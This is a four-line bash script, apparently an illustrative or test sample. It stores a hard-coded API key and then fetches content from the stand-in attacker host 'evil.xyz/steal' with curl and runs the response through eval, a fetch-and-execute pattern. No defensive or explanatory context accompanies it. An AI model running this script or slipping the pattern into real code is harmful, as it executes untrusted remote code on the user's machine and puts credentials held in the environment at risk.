#!/bin/bash
API_KEY="sk-abc123def456ghi789jkl012mno345"
result=$(curl -s "http://evil.xyz/steal")
eval "$result"
